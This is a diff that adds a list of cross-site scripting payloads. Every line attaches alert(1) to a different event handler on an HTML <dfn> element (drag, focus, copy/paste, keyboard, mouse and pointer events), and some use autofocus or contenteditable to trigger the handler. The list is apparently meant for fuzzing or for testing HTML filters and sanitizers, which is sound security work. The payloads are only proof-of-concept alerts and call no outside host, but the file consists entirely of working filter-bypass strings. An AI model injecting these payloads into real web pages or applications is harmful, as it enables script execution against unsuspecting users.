@@ -1,0 +1,43 @@
+<dfn draggable="true" ondrag="alert(1)">test</dfn>
+<dfn draggable="true" ondragend="alert(1)">test</dfn>
+<dfn draggable="true" ondragenter="alert(1)">test</dfn>
+<dfn draggable="true" ondragleave="alert(1)">test</dfn>
+<dfn draggable="true" ondragstart="alert(1)">test</dfn>
+<dfn id=x tabindex=1 onactivate=alert(1)></dfn>
+<dfn id=x tabindex=1 onbeforeactivate=alert(1)></dfn>
+<dfn id=x tabindex=1 onbeforedeactivate=alert(1)></dfn><input autofocus>
+<dfn id=x tabindex=1 ondeactivate=alert(1)></dfn><input id=y autofocus>
+<dfn id=x tabindex=1 onfocus=alert(1)></dfn>
+<dfn id=x tabindex=1 onfocusin=alert(1)></dfn>
+<dfn onafterscriptexecute=alert(1)><script>1</script>
+<dfn onbeforecopy="alert(1)" contenteditable>test</dfn>
+<dfn onbeforecut="alert(1)" contenteditable>test</dfn>
+<dfn onbeforepaste="alert(1)" contenteditable>test</dfn>
+<dfn onbeforescriptexecute=alert(1)><script>1</script>
+<dfn onblur=alert(1) tabindex=1 id=x></dfn><input autofocus>
+<dfn onclick="alert(1)">test</dfn>
+<dfn oncontextmenu="alert(1)">test</dfn>
+<dfn oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<dfn oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<dfn ondblclick="alert(1)" autofocus tabindex=1>test</dfn>
+<dfn onfocusout=alert(1) tabindex=1 id=x></dfn><input autofocus>
+<dfn onkeydown="alert(1)" contenteditable>test</dfn>
+<dfn onkeypress="alert(1)" contenteditable>test</dfn>
+<dfn onkeyup="alert(1)" contenteditable>test</dfn>
+<dfn onmousedown="alert(1)">test</dfn>
+<dfn onmouseenter="alert(1)">test</dfn>
+<dfn onmouseleave="alert(1)">test</dfn>
+<dfn onmousemove="alert(1)">test</dfn>
+<dfn onmouseout="alert(1)">test</dfn>
+<dfn onmouseover="alert(1)">test</dfn>
+<dfn onmouseup="alert(1)">test</dfn>
+<dfn onmousewheel=alert(1)>requires scrolling
+<dfn onpaste="alert(1)" contenteditable>test</dfn>
+<dfn onpointerdown=alert(1)>XSS</dfn>
+<dfn onpointerenter=alert(1)>XSS</dfn>
+<dfn onpointerleave=alert(1)>XSS</dfn>
+<dfn onpointermove=alert(1)>XSS</dfn>
+<dfn onpointerout=alert(1)>XSS</dfn>
+<dfn onpointerover=alert(1)>XSS</dfn>
+<dfn onpointerrawupdate=alert(1)>XSS</dfn>
+<dfn onpointerup=alert(1)>XSS</dfn>
